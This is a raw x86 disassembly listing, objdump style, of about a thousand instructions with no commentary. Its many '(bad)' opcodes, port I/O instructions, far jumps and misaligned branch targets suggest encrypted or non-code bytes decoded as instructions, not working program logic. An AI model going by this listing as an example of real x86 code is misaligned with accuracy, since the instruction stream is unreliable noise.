  405c6d:	mov    esp,0x5d9348a6
  405c72:	adc    eax,0xd86b0ccc
  405c77:	jp     0x405cf2
  405c79:	xchg   edx,eax
  405c7a:	jmp    0x11bcf628
  405c7f:	sbb    DWORD PTR [esi],esp
  405c81:	mov    edx,0x11d14e30
  405c86:	push   eax
  405c87:	mov    BYTE PTR [eax],ah
  405c89:	pop    ebx
  405c8a:	mov    edx,0x7116709c
  405c8f:	in     eax,0x49
  405c91:	cld    
  405c92:	out    dx,al
  405c93:	pop    ebp
  405c94:	cmc    
  405c95:	cmp    edi,ecx
  405c97:	imul   edx,DWORD PTR ds:0xf5aa9ba7,0xad1678f0
  405ca1:	in     al,0x95
  405ca3:	pushf  
  405ca4:	adc    BYTE PTR [ecx+0x781b700a],bh
  405caa:	xlat   BYTE PTR ds:[ebx]
  405cab:	shr    BYTE PTR [eax+0x36423ed0],1
  405cb1:	inc    eax
  405cb2:	xchg   BYTE PTR ds:0x51a33e23,ah
  405cb8:	jne    0x405c81
  405cba:	fld    st(5)
  405cbc:	adc    al,0xf7
  405cbe:	lds    bp,DWORD PTR [edi+0x9]
  405cc2:	aaa    
  405cc3:	test   ah,bl
  405cc5:	sar    BYTE PTR [edx+ebx*2+0x5f936410],1
  405ccc:	or     dl,bh
  405cce:	jbe    0x405d2b
  405cd0:	cwde   
  405cd1:	mov    ah,0x9c
  405cd3:	mov    esi,fs
  405cd5:	(bad)  
  405cd6:	call   FWORD PTR [edx]
  405cd8:	xchg   ebx,eax
  405cd9:	pop    es
  405cda:	stos   BYTE PTR es:[edi],al
  405cdb:	in     eax,dx
  405cdc:	push   0x690ec293
  405ce1:	dec    eax
  405ce2:	pop    eax
  405ce3:	mov    eax,ds:0x52bb40b6
  405ce8:	sub    eax,0x62561d80
  405ced:	add    eax,0x5cfc868a
  405cf2:	pop    edx
  405cf3:	iret   
  405cf4:	fisttp DWORD PTR [esi+eax*8-0x4290f006]
  405cfb:	inc    eax
  405cfc:	stc    
  405cfd:	mov    eax,ds:0xeb9377b0
  405d02:	pop    esi
  405d03:	dec    ecx
  405d04:	inc    esp
  405d05:	mov    cl,0x75
  405d07:	rcr    DWORD PTR [esi],1
  405d09:	arpl   WORD PTR [edi-0x1],bp
  405d0c:	mov    DWORD PTR [edi-0x76],eax
  405d0f:	daa    
  405d10:	and    ebp,DWORD PTR [ecx-0x11]
  405d13:	nop
  405d14:	gs jg  0x405d4f
  405d17:	pop    edi
  405d18:	pop    ds
  405d19:	cli    
  405d1a:	cdq    
  405d1b:	dec    edx
  405d1c:	inc    ebx
  405d1d:	jl     0x405ca1
  405d1f:	push   ecx
  405d20:	mov    eax,0x190b06fd
  405d25:	and    dl,BYTE PTR cs:[ebx]
  405d28:	mov    dl,0x7
  405d2a:	pop    ecx
  405d2b:	push   es
  405d2c:	adc    DWORD PTR [edx+0x12],edi
  405d2f:	push   edx
  405d30:	dec    eax
  405d31:	or     ch,al
  405d33:	lods   eax,DWORD PTR ds:[esi]
  405d34:	clc    
  405d35:	dec    ebp
  405d36:	outs   dx,BYTE PTR ds:[esi]
  405d37:	shl    DWORD PTR [ecx],0x24
  405d3a:	arpl   WORD PTR [ebx+0x24],ax
  405d3d:	push   ds
  405d3e:	test   eax,0xa7888729
  405d43:	mov    dl,0xba
  405d45:	mov    ?,WORD PTR [esi+0x5e772df4]
  405d4b:	add    ah,ah
  405d4d:	dec    edi
  405d4e:	and    ebx,DWORD PTR [edx-0x5e]
  405d51:	cmp    eax,0xf59df48b
  405d56:	inc    ecx
  405d57:	sub    DWORD PTR [ebx],edi
  405d59:	mov    ds:0x56f14a32,al
  405d5e:	xchg   edx,eax
  405d5f:	mov    ch,0xe9
  405d61:	les    edx,FWORD PTR [esp+edx*8]
  405d64:	lahf   
  405d65:	jne    0x405dbc
  405d67:	lds    eax,FWORD PTR [eax+edi*4+0x15]
  405d6b:	jg     0x405dd8
  405d6d:	retf   0x45a1
  405d70:	pop    esp
  405d71:	xor    al,0xca
  405d73:	cmc    
  405d74:	mov    dh,0x6d
  405d76:	inc    edi
  405d77:	out    0x8c,eax
  405d79:	es jecxz 0x405dce
  405d7c:	sti    
  405d7d:	mov    ah,0x94
  405d7f:	ja     0x405d16
  405d81:	popa   
  405d82:	and    BYTE PTR [edx-0x2],ch
  405d85:	retf   0xd59e
  405d88:	mov    edx,esi
  405d8a:	sub    edx,DWORD PTR [edx-0x26]
  405d8d:	mov    ch,BYTE PTR [edx]
  405d8f:	in     al,0x9f
  405d91:	push   ds
  405d92:	leave  
  405d93:	push   ecx
  405d94:	mov    edi,DWORD PTR [ecx-0x128e72df]
  405d9a:	aad    0x12
  405d9c:	mov    ds:0x6dee34af,eax
  405da1:	test   bl,ch
  405da3:	add    DWORD PTR [eax],edi
  405da5:	iret   
  405da6:	stos   BYTE PTR es:[edi],al
  405da7:	hlt    
  405da8:	and    DWORD PTR [edi-0x1a86b89d],esp
  405dae:	pop    ebp
  405daf:	push   edx
  405db0:	mov    edx,0xe9e0d979
  405db5:	lahf   
  405db6:	jne    0x405e0e
  405db8:	jno    0x405d46
  405dba:	ss jb  0x405d5e
  405dbd:	shr    DWORD PTR [eax],0xf5
  405dc0:	bound  ebp,QWORD PTR [eax+eiz*8-0x77e1d0ce]
  405dc7:	push   ebx
  405dc8:	sub    ebx,DWORD PTR [esi-0x33]
  405dcb:	sbb    al,0x67
  405dcd:	rol    DWORD PTR [edi+0x6],1
  405dd0:	mov    eax,0x2c28a463
  405dd5:	jns    0x405dae
  405dd7:	aaa    
  405dd8:	out    dx,al
  405dd9:	stos   DWORD PTR es:[edi],eax
  405dda:	xchg   ecx,eax
  405ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ddc:	dec    ecx
  405ddd:	aad    0xa
  405ddf:	push   0xf4802965
  405de4:	mov    al,0xb2
  405de6:	scas   eax,DWORD PTR es:[edi]
  405de7:	loope  0x405e40
  405de9:	pop    ebp
  405dea:	and    BYTE PTR [edx+0x22],0x8d
  405dee:	mov    eax,ds:0x8649b53d
  405df3:	mov    al,0x54
  405df5:	inc    ecx
  405df6:	mov    dh,0x50
  405df8:	push   edi
  405df9:	data16 sbb BYTE PTR [edx+0xb],bh
  405dfd:	scas   eax,DWORD PTR es:[edi]
  405dfe:	lods   eax,DWORD PTR ds:[esi]
  405dff:	sbb    BYTE PTR [ebx],0xb5
  405e02:	mov    fs:0xaf7f2159,eax
  405e08:	mov    dl,0x59
  405e0a:	fdiv   DWORD PTR [edi]
  405e0c:	in     al,0x8f
  405e0e:	aaa    
  405e0f:	adc    bh,BYTE PTR [eax+eax*8+0x22]
  405e13:	ja     0x405df2
  405e15:	mov    ebp,ss
  405e17:	xchg   ecx,eax
  405e18:	rcr    ah,0x60
  405e1b:	and    ecx,DWORD PTR [ebx+0x54]
  405e1e:	jbe    0x405e7f
  405e20:	fbld   TBYTE PTR [esi-0x643a727f]
  405e26:	pop    ds
  405e27:	push   esi
  405e28:	ja     0x405e09
  405e2a:	out    dx,eax
  405e2b:	jns    0x405dad
  405e2d:	add    esi,DWORD PTR [eax-0x53c235b3]
  405e33:	jns    0x405e54
  405e35:	and    BYTE PTR [edx+0x7511d545],bl
  405e3b:	xlat   BYTE PTR ds:[ebx]
  405e3c:	repz icebp 
  405e3e:	or     ebx,DWORD PTR [edx]
  405e40:	and    al,0x2b
  405e42:	leave  
  405e43:	outs   dx,DWORD PTR ds:[esi]
  405e44:	ja     0x405e28
  405e46:	div    BYTE PTR [ebx+0x26]
  405e49:	or     BYTE PTR [esi+ebp*2+0x54ac8e00],cl
  405e50:	add    DWORD PTR [esp+edi*4],ebx
  405e53:	ss and edx,ebx
  405e56:	sub    bh,BYTE PTR [eax-0x247405d0]
  405e5c:	add    al,0x9b
  405e5e:	(bad)
  405e61:	in     eax,0x22
  405e63:	add    bl,0x5e
  405e66:	mov    WORD PTR [ebx+0x1100fcd1],ss
  405e6c:	or     dl,al
  405e6e:	and    DWORD PTR [ecx-0x268171e7],edi
  405e74:	fst    QWORD PTR [esi-0x3172628f]
  405e7a:	das    
  405e7b:	cmp    eax,0x64396756
  405e80:	mov    bl,0x97
  405e82:	clc    
  405e83:	bound  esp,QWORD PTR [ebp-0x2d]
  405e86:	not    BYTE PTR [ecx-0x12327ef8]
  405e8c:	lahf   
  405e8d:	hlt    
  405e8e:	aad    0xd1
  405e90:	test   DWORD PTR [esi+0x14329a46],0xde5e102b
  405e9a:	pop    ss
  405e9b:	(bad)  
  405e9c:	pop    edx
  405e9d:	mov    ebp,0x2077e7c1
  405ea2:	retf   
  405ea3:	inc    ecx
  405ea4:	xor    BYTE PTR [eax],0xa9
  405ea7:	cmc    
  405ea8:	jp     0x405f07
  405eaa:	mov    al,ds:0x321958a
  405eaf:	cwde   
  405eb0:	or     DWORD PTR [esi+0x2d],ecx
  405eb3:	aam    0xc1
  405eb5:	xor    dh,0xc
  405eb8:	les    esi,FWORD PTR [edx]
  405eba:	or     ch,BYTE PTR [ebx-0x203b37c6]
  405ec0:	lods   eax,DWORD PTR ds:[esi]
  405ec1:	aam    0x64
  405ec3:	pop    esp
  405ec4:	icebp  
  405ec5:	sbb    al,0x3e
  405ec7:	loope  0x405eeb
  405ec9:	and    BYTE PTR [ebx],bl
  405ecb:	retf   
  405ecc:	jnp    0x405ea4
  405ece:	call   0x3f39:0x24f46d6c
  405ed5:	xchg   ecx,eax
  405ed6:	sbb    eax,0x638a6ea0
  405edb:	sub    al,al
  405edd:	inc    ecx
  405ede:	leave  
  405edf:	dec    edi
  405ee0:	rol    DWORD PTR [ecx+0x1e03124a],1
  405ee6:	mov    dl,0xf5
  405ee8:	jl     0x405eb7
  405eea:	or     al,0x62
  405eec:	mov    al,0x9
  405eee:	into   
  405eef:	inc    edi
  405ef0:	in     eax,0x9f
  405ef2:	pushf  
  405ef3:	adc    esi,esi
  405ef5:	xchg   ebx,eax
  405ef6:	ret    
  405ef7:	mov    esp,DWORD PTR [ebx-0x5c669ac]
  405efd:	xchg   ebp,eax
  405efe:	cmp    al,0x5e
  405f00:	ror    DWORD PTR [ecx+0x568abf4e],0xb4
  405f07:	mov    ebx,0x357a6f2e
  405f0c:	nop
  405f0d:	(bad)  
  405f0e:	dec    edi
  405f0f:	rol    ebx,1
  405f11:	add    eax,0x360151aa
  405f16:	xor    DWORD PTR [ecx],ecx
  405f18:	test   eax,0x8f1ed156
  405f1d:	and    ebp,DWORD PTR [edi+0x5e015fa7]
  405f23:	mov    ?,WORD PTR es:[ebx+esi*4]
  405f27:	sub    ch,BYTE PTR [eax+0x176102c3]
  405f2d:	pop    ebx
  405f2e:	cmp    BYTE PTR [ebp-0x77],dh
  405f31:	cwde   
  405f32:	pop    esi
  405f33:	mov    DWORD PTR [ebx-0x35bbbc29],edi
  405f39:	push   ss
  405f3a:	mov    ebp,0x8979ed20
  405f3f:	lods   eax,DWORD PTR ds:[esi]
  405f40:	mov    BYTE PTR [edx+eiz*1+0x5cfb58ba],dh
  405f47:	adc    al,0x6a
  405f49:	lods   eax,DWORD PTR ds:[esi]
  405f4a:	jne    0x405ee9
  405f4c:	jmp    0x405ee8
  405f4e:	hlt    
  405f4f:	daa    
  405f50:	in     eax,dx
  405f51:	scas   eax,DWORD PTR es:[edi]
  405f52:	hlt    
  405f53:	jae    0x405fd4
  405f55:	push   cs
  405f56:	pop    ss
  405f57:	mov    WORD PTR [edi+0x3937396a],?
  405f5d:	inc    ecx
  405f5e:	push   edx
  405f5f:	(bad)  
  405f60:	std    
  405f61:	inc    ebx
  405f62:	pop    eax
  405f63:	dec    ebp
  405f64:	repz push ebx
  405f66:	pop    edi
  405f67:	outs   dx,DWORD PTR ds:[esi]
  405f68:	dec    ecx
  405f69:	mov    dh,0xc
  405f6b:	jg     0x405f5d
  405f6d:	(bad)  
  405f6f:	mov    cl,0x9a
  405f71:	fldpi  
  405f73:	es aad 0x78
  405f76:	cdq    
  405f77:	in     eax,dx
  405f78:	addr16 repz loope 0x405f96
  405f7c:	lods   al,BYTE PTR ds:[esi]
  405f7d:	inc    edi
  405f7e:	cmp    al,BYTE PTR [ecx-0x66675baa]
  405f84:	hlt    
  405f85:	and    BYTE PTR [ecx],dl
  405f87:	push   ecx
  405f88:	out    0xab,eax
  405f8a:	xchg   edx,esi
  405f8c:	inc    ebx
  405f8d:	mov    al,0xf9
  405f8f:	mov    cs,ebx
  405f91:	xchg   ecx,eax
  405f92:	ins    BYTE PTR es:[edi],dx
  405f93:	add    eax,0x1d58ef66
  405f98:	rcl    edi,0xeb
  405f9b:	cmp    eax,0x736dbe91
  405fa0:	outs   dx,DWORD PTR ds:[esi]
  405fa1:	in     al,dx
  405fa2:	popa   
  405fa3:	xor    BYTE PTR [edx],bh
  405fa5:	push   esi
  405fa6:	jne    0x405f98
  405fa8:	mov    ds:0xcc1f6062,eax
  405fad:	ret    
  405fae:	adc    BYTE PTR [ebx+0x77d7aadf],bh
  405fb4:	mov    ds:0xdc86a2b2,eax
  405fb9:	xor    DWORD PTR [edi],esp
  405fbb:	mov    BYTE PTR [eax-0x41],bl
  405fbe:	jo     0x405faa
  405fc0:	je     0x405fe6
  405fc2:	sub    DWORD PTR [edx],ebp
  405fc4:	jo     0x405feb
  405fc6:	mov    al,ds:0xae1eab1d
  405fcb:	push   0xd7767b2f
  405fd0:	(bad)  
  405fd1:	pushf  
  405fd2:	mov    bl,0x1c
  405fd4:	lods   al,BYTE PTR ds:[esi]
  405fd5:	aad    0x15
  405fd7:	jo     0x405f72
  405fd9:	in     eax,0xdc
  405fdb:	jnp    0x405fb5
  405fdd:	xchg   ebp,eax
  405fde:	out    0xcc,eax
  405fe0:	add    ecx,DWORD PTR [ebx]
  405fe2:	sub    al,0xe8
  405fe4:	sub    al,0xc2
  405fe6:	(bad)  
  405fe7:	jmp    0xea2a:0xc7fd3944
  405fee:	adc    eax,0xee7d5e18
  405ff3:	mul    DWORD PTR [ebx+0x51d7f378]
  405ff9:	or     DWORD PTR [ebx+0x36],ecx
  405ffc:	sti    
  405ffd:	popa   
  405ffe:	sbb    eax,0x34860ff
  406003:	dec    ecx
  406004:	mov    esi,0x673c2ec5
  406009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600a:	sbb    BYTE PTR [ebp-0x1b],ah
  40600d:	div    dh
  40600f:	das    
  406010:	mov    ds:0x2b2b8bfc,al
  406015:	push   ds
  406016:	and    BYTE PTR [ebp+0x5937349e],cl
  40601c:	or     al,0x74
  40601e:	stc    
  40601f:	rcr    BYTE PTR ds:0x9a3e4915,cl
  406025:	retf   0x348c
  406028:	sbb    al,0x5c
  40602a:	lds    esi,FWORD PTR [ebx]
  40602c:	addr16 mov eax,0x23f7378b
  406032:	xor    BYTE PTR [edx+0x55cceb1b],bl
  406038:	add    eax,0xec869cbb
  40603d:	adc    al,0x8b
  40603f:	cmp    DWORD PTR [ebp+0x29],edx
  406042:	jmp    0x4060b9
  406044:	pop    esi
  406045:	jnp    0x406045
  406047:	mov    cl,0xf5
  406049:	fisubr WORD PTR [edx+edx*1-0x4bbfb347]
  406050:	xchg   ecx,eax
  406051:	xor    ecx,ecx
  406053:	hlt    
  406054:	sbb    DWORD PTR [eax],ecx
  406056:	pop    ds
  406057:	jnp    0x40606e
  406059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605a:	sbb    edx,DWORD PTR [esi+0x42ef9878]
  406060:	test   al,0xc2
  406062:	mov    al,0x14
  406064:	aaa    
  406065:	pop    eax
  406066:	jo     0x406030
  406068:	add    eax,0xfba663b9
  40606d:	cwde   
  40606e:	aaa    
  40606f:	mov    cl,BYTE PTR [eax+0x736b1b24]
  406075:	hlt    
  406076:	mov    ss,WORD PTR [ebx-0x53]
  406079:	rcr    esi,cl
  40607b:	dec    eax
  40607c:	outs   dx,DWORD PTR ds:[esi]
  40607d:	cmp    al,0x51
  40607f:	in     eax,0x74
  406081:	fnstenv [ecx-0x610c69bc]
  406087:	call   0xfee8073a
  40608c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40608d:	retf   
  40608e:	or     al,0x5
  406090:	std    
  406091:	mov    ecx,0x5a94b5a0
  406096:	mov    ah,0x7e
  406098:	adc    BYTE PTR [edx],0x9c
  40609b:	xchg   edi,eax
  40609c:	inc    eax
  40609d:	addr16 or ch,ch
  4060a0:	jl     0x4060c2
  4060a2:	jns    0x4060b4
  4060a4:	test   eax,0xecedb7b2
  4060a9:	mov    ecx,0x865082cc
  4060ae:	xchg   ebx,eax
  4060af:	addr16 ret 0xef4f
  4060b3:	ficomp WORD PTR [esi-0x12a3c9d3]
  4060b9:	cmp    BYTE PTR [esi+0x3f],dl
  4060bc:	fbstp  TBYTE PTR [edi-0x77]
  4060bf:	sbb    DWORD PTR [ebx-0x8],esi
  4060c2:	pop    ecx
  4060c3:	repnz add al,0xb1
  4060c6:	mov    cl,0x28
  4060c8:	test   eax,0x1845786b
  4060cd:	mov    ebx,0xebcde8b
  4060d2:	lods   al,BYTE PTR ds:[esi]
  4060d3:	scas   al,BYTE PTR es:[edi]
  4060d4:	test   bl,ch
  4060d6:	pop    esp
  4060d7:	jno    0x40612b
  4060d9:	jbe    0x406102
  4060db:	jmp    0x406129
  4060dd:	inc    edx
  4060de:	or     eax,DWORD PTR [ecx+0x73a4604b]
  4060e4:	adc    BYTE PTR [esi+0x8c9fba6],ah
  4060ea:	or     edx,0xffffffb5
  4060ed:	hlt    
  4060ee:	fld    DWORD PTR [edi-0x50]
  4060f1:	and    BYTE PTR [ebx],ah
  4060f3:	and    ebx,DWORD PTR [ebp+0x39]
  4060f6:	loopne 0x406124
  4060f8:	or     eax,0x148e1ac8
  4060fd:	sbb    bl,BYTE PTR [edx+0x530b0bef]
  406103:	shr    DWORD PTR [ecx-0x490ba38e],1
  406109:	jmp    0x1400:0xbe05681f
  406110:	and    eax,0x4a03d2a2
  406115:	dec    ebx
  406116:	pop    ds
  406117:	xchg   ebp,eax
  406118:	psubq  mm1,mm0
  40611b:	mov    esp,0x7d0d9ee6
  406120:	imul   ecx,edx,0xa77f5df9
  406126:	inc    DWORD PTR [esi-0x41]
  406129:	ror    DWORD PTR [edi],0x48
  40612c:	dec    ebp
  40612d:	std    
  40612e:	jle    0x4060c4
  406130:	add    ch,BYTE PTR [ebp-0x5293db30]
  406136:	sbb    esi,0xffffffe1
  406139:	pop    es
  40613a:	addr16 sahf 
  40613c:	aam    0x4f
  40613e:	jg     0x4061bd
  406140:	or     DWORD PTR [esi],0xffffff85
  406143:	jmp    0x60726482
  406148:	inc    edi
  406149:	add    BYTE PTR [edx+ebx*4-0x281c9a80],al
  406150:	pop    ecx
  406151:	xchg   BYTE PTR [ebp-0x17cb1432],dl
  406157:	cmp    bl,ch
  406159:	adc    ah,0x46
  40615c:	sbb    BYTE PTR [ecx],dl
  40615e:	mov    ecx,0xbb5b9f7e
  406163:	lock shr BYTE PTR [esi+0x6a433904],0x3a
  40616b:	cs adc eax,0x2b252ded
  406171:	sbb    al,0xe6
  406173:	push   ss
  406174:	nop
  406175:	xchg   edi,eax
  406176:	push   0xfffffffc
  406178:	cli    
  406179:	lods   al,BYTE PTR ds:[esi]
  40617a:	pop    edi
  40617b:	stos   DWORD PTR es:[edi],eax
  40617c:	cmp    eax,0xcd8ccc9
  406181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406182:	mov    al,0x83
  406184:	push   eax
  406185:	sbb    ebp,edi
  406187:	cmp    eax,0x7c89ef2b
  40618c:	shl    DWORD PTR [edi-0x4f986e0],cl
  406192:	leave  
  406193:	div    eax
  406195:	call   0xe9ed:0x854a630f
  40619c:	dec    ecx
  40619d:	out    0x94,al
  40619f:	add    eax,edi
  4061a1:	aas    
  4061a2:	mov    BYTE PTR [edi+0x7c],ch
  4061a5:	cmp    al,0xd6
  4061a7:	jne    0x4061f2
  4061a9:	jbe    0x4061fa
  4061ab:	out    dx,al
  4061ac:	jmp    0x40622a
  4061ae:	mov    al,ds:0xeefb26fd
  4061b3:	(bad)  
  4061b4:	sti    
  4061b5:	xchg   DWORD PTR [ebx-0x7bf018c6],ecx
  4061bb:	arpl   WORD PTR [eax-0x3fd9ed18],sp
  4061c1:	retf   
  4061c2:	leave  
  4061c3:	pushf  
  4061c4:	push   cs
  4061c5:	dec    eax
  4061c6:	and    eax,0x1414820
  4061cb:	mov    edx,0x2c8e1275
  4061d0:	imul   ecx,DWORD PTR ds:0x452af5db,0xd4e69173
  4061da:	adc    esi,DWORD PTR [ebp+edi*8+0x78e085bf]
  4061e1:	dec    ebp
  4061e2:	add    edx,DWORD PTR [eax-0xd]
  4061e5:	gs jbe 0x4061ec
  4061e8:	out    dx,eax
  4061e9:	cld    
  4061ea:	push   0x6d
  4061ec:	xor    ebx,DWORD PTR [esp+esi*1+0x49cb78ce]
  4061f3:	dec    ebp
  4061f4:	test   al,0x7
  4061f6:	xchg   ecx,eax
  4061f7:	int3   
  4061f8:	push   cs
  4061f9:	mov    ah,0x5a
  4061fb:	(bad)  
  4061fc:	clc    
  4061fd:	aam    0x3c
  4061ff:	in     eax,0x6d
  406201:	sub    al,0xc5
  406203:	mov    ecx,ebp
  406205:	sbb    DWORD PTR [edx-0x7c228610],edx
  40620b:	fwait
  40620c:	pop    edx
  40620d:	mov    dl,0xec
  40620f:	arpl   WORD PTR [edi],dx
  406211:	jnp    0x406260
  406213:	daa    
  406214:	fild   QWORD PTR [edi+ebp*2]
  406217:	(bad)  
  406218:	cmp    eax,0x92610f53
  40621d:	clc    
  40621e:	push   ss
  40621f:	mov    eax,ds:0xc6fdec73
  406224:	outs   dx,BYTE PTR ds:[esi]
  406225:	and    ebp,DWORD PTR [esi+esi*4+0x22861554]
  40622c:	sub    BYTE PTR [ecx+0x52234ca3],0x15
  406233:	sbb    eax,DWORD PTR [edi]
  406235:	sti    
  406236:	sbb    ebx,DWORD PTR [ebx]
  406238:	jbe    0x40625a
  40623a:	jl     0x4062b3
  40623c:	nop
  40623d:	scas   al,BYTE PTR es:[edi]
  40623e:	mov    ebx,0x319ea1fd
  406243:	sti    
  406244:	push   edx
  406245:	xor    eax,0xe6e544ac
  40624a:	cmp    esp,DWORD PTR [eax-0x1c]
  40624d:	mov    edi,0x94675cb6
  406252:	enter  0xc7e9,0x12
  406256:	inc    ecx
  406257:	add    BYTE PTR [eax],cl
  406259:	xor    esp,DWORD PTR [ebx+0x3f]
  40625c:	sub    DWORD PTR [edx],esi
  40625e:	jno    0x406251
  406260:	sub    eax,DWORD PTR [edi-0x67]
  406263:	and    ah,BYTE PTR ds:0x6a75cc0f
  406269:	xchg   edi,eax
  40626a:	xor    BYTE PTR [edi-0x3f950a86],0x44
  406271:	add    edx,DWORD PTR [ebx-0x18eb1679]
  406277:	fnop   
  406279:	fild   WORD PTR [ecx-0x5bae0141]
  40627f:	jmp    0x4062ec
  406281:	sbb    BYTE PTR [ebp+0x9aa8c2],bh
  406287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406288:	push   ss
  406289:	add    eax,0xea4ce8e3
  40628e:	push   esp
  40628f:	sub    al,0xd1
  406291:	sbb    BYTE PTR [ecx-0x3b3ea90b],bl
  406297:	sbb    al,0xc9
  406299:	sub    edx,DWORD PTR [edi]
  40629b:	add    eax,0xcc831f62
  4062a0:	xchg   ebx,eax
  4062a1:	adc    dh,BYTE PTR [edi+0x4f]
  4062a4:	test   BYTE PTR [ebx],ah
  4062a6:	fst    QWORD PTR [ecx]
  4062a8:	test   eax,0x8629b587
  4062ad:	out    0x6f,eax
  4062af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062b0:	dec    esp
  4062b1:	jle    0x4062f8
  4062b3:	add    ebp,ecx
  4062b5:	sub    eax,0x6f8eeb58
  4062ba:	inc    ecx
  4062bb:	rol    eax,cl
  4062bd:	push   ecx
  4062be:	inc    eax
  4062bf:	xor    DWORD PTR [eax+eiz*2],0x79
  4062c3:	mov    ah,ch
  4062c5:	push   0x14
  4062c7:	xchg   ebp,eax
  4062c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062c9:	fisttp WORD PTR [edx]
  4062cb:	hlt    
  4062cc:	(bad)  
  4062cd:	addr16 adc ah,ah
  4062d0:	and    BYTE PTR [edi-0x7bd71cc5],ch
  4062d6:	xor    eax,0xc98365b0
  4062db:	mov    edx,0x6d1b0a86
  4062e0:	sub    eax,0x318b5c4e
  4062e5:	cld    
  4062e6:	imul   ecx,DWORD PTR [ebx],0x96771f4b
  4062ec:	sub    BYTE PTR [ecx-0x10fbe974],bl
  4062f2:	mov    al,ds:0x5d0c4f9d
  4062f7:	sbb    ch,BYTE PTR ds:[ebp+0x4]
  4062fb:	fsub   QWORD PTR [ebx-0x36]
  4062fe:	adc    eax,0xfdf0b9dc
  406303:	push   eax
  406304:	je     0x406384
  406306:	into   
  406307:	fcomp  st(5)
  406309:	hlt    
  40630a:	mov    ds:0x3aa5a5f9,al
  40630f:	pop    ebx
  406310:	in     al,dx
  406311:	out    0x7c,eax
  406313:	loope  0x4062e8
  406315:	mov    bh,0xba
  406317:	dec    edx
  406318:	js     0x40635e
  40631a:	mov    al,0x63
  40631c:	js     0x40636a
  40631e:	xlat   BYTE PTR ds:[ebx]
  40631f:	jne    0x406325
  406321:	adc    BYTE PTR [edi],ch
  406323:	dec    ecx
  406324:	mov    ebx,0x4d9b4e19
  406329:	mov    edx,0x3a3ec631
  40632e:	xchg   ecx,eax
  40632f:	cmp    dl,BYTE PTR [ebx+esi*4-0x58f6f7f2]
  406336:	sbb    eax,ecx
  406338:	mov    dh,0x29
  40633a:	fwait
  40633b:	pop    ebp
  40633c:	shl    BYTE PTR [ebx],0xd0
  40633f:	dec    edi
  406340:	inc    esi
  406341:	or     DWORD PTR [edx+ebp*4],ebx
  406344:	mov    DWORD PTR [edx],0x9811ac4
  40634a:	dec    esi
  40634b:	in     al,0xc2
  40634d:	pusha  
  40634e:	scas   al,BYTE PTR es:[edi]
  40634f:	mov    bl,0xbe
  406351:	sub    eax,0x3d0793b2
  406356:	mov    BYTE PTR [esi+esi*1+0x80c8b82],dl
  40635d:	adc    DWORD PTR [ebx+0x2e7f1ef6],0x5333208b
  406367:	lahf   
  406368:	mov    ch,0x7d
  40636a:	into   
  40636b:	dec    ecx
  40636c:	mov    bh,0x61
  40636e:	js     0x406311
  406370:	cwde   
  406371:	popa   
  406372:	push   0x2d
  406374:	ss push ecx
  406376:	xchg   esi,eax
  406377:	popf   
  406378:	push   cs
  406379:	dec    esp
  40637a:	push   0x35
  40637c:	xchg   ebx,eax
  40637d:	xor    ebx,DWORD PTR [ecx*8+0x53387f7]
  406384:	adc    BYTE PTR [edi-0x754da90a],dh
  40638a:	push   edx
  40638b:	imul   BYTE PTR [esi+0x266560cd]
  406391:	sbb    DWORD PTR [edx],0x45a7ee0c
  406397:	je     0x4063cb
  406399:	pop    ebx
  40639a:	enter  0xe6bf,0xd
  40639e:	mov    al,0x7a
  4063a0:	xor    edi,DWORD PTR [edi+0x7c]
  4063a3:	push   ebp
  4063a4:	pop    eax
  4063a5:	pushf  
  4063a6:	sahf   
  4063a7:	jecxz  0x4063e8
  4063a9:	sbb    bh,dh
  4063ab:	and    DWORD PTR [ebx-0x6d],edx
  4063ae:	xor    al,0x35
  4063b0:	push   ecx
  4063b1:	popa   
  4063b2:	xchg   edi,eax
  4063b3:	mov    ah,al
  4063b5:	les    ebp,FWORD PTR [esi+eiz*1+0x3b60c3f2]
  4063bc:	mov    ?,WORD PTR [ebp+edx*2-0x7c]
  4063c0:	xchg   ebx,eax
  4063c1:	and    eax,0x98dff1c7
  4063c6:	mov    ch,0x91
  4063c8:	enter  0xd72a,0xe2
  4063cc:	retf   
  4063cd:	pop    ecx
  4063ce:	out    dx,eax
  4063cf:	loopne 0x40635d
  4063d1:	mov    es,ebp
  4063d3:	out    dx,al
  4063d4:	dec    edi
  4063d5:	out    dx,eax
  4063d6:	mov    ch,0x72
  4063d8:	aas    
  4063d9:	and    DWORD PTR [ecx+0x22ecfb27],0x2ddb3964
  4063e3:	and    BYTE PTR [esi-0x307e359],dl
  4063e9:	out    0x0,al
  4063eb:	and    edi,DWORD PTR ds:0xea17cac8
  4063f1:	or     BYTE PTR [ecx-0x61],ah
  4063f4:	or     ecx,esp
  4063f6:	dec    esp
  4063f7:	push   esp
  4063f8:	push   cs
  4063f9:	jp     0x40645e
  4063fb:	inc    ebx
  4063fc:	call   0x8196:0x983d8d48
  406403:	or     DWORD PTR ds:0xc629cc83,edx
  406409:	sub    esp,DWORD PTR ds:0xbfe34d87
  40640f:	or     dl,BYTE PTR [ecx-0x142047e5]
  406415:	jb     0x4063af
  406417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406418:	or     eax,0xf67d97e3
  40641d:	xor    al,0x52
  40641f:	test   DWORD PTR [ebx],ecx
  406421:	aad    0xe8
  406423:	(bad)  
  406424:	int3   
  406425:	or     ebp,edi
  406427:	pop    edx
  406428:	adc    ebp,DWORD PTR [edx+0x13]
  40642b:	push   ds
  40642c:	pop    ecx
  40642d:	pop    ebp
  40642e:	fild   QWORD PTR [ebx]
  406430:	add    eax,0x470addad
  406435:	sbb    DWORD PTR [ebp-0x30bf9f96],0xe
  40643c:	inc    ebx
  40643d:	shl    BYTE PTR [ecx-0x629a1d8f],cl
  406443:	push   DWORD PTR gs:[esi+0x16]
  406447:	out    0x99,al
  406449:	xchg   esp,eax
  40644a:	push   ebx
  40644b:	pusha  
  40644c:	out    0x2d,eax
  40644e:	outs   dx,BYTE PTR ds:[esi]
  40644f:	repz pop edx
  406451:	cmp    al,0xbd
  406453:	pop    esi
  406454:	out    0xc,eax
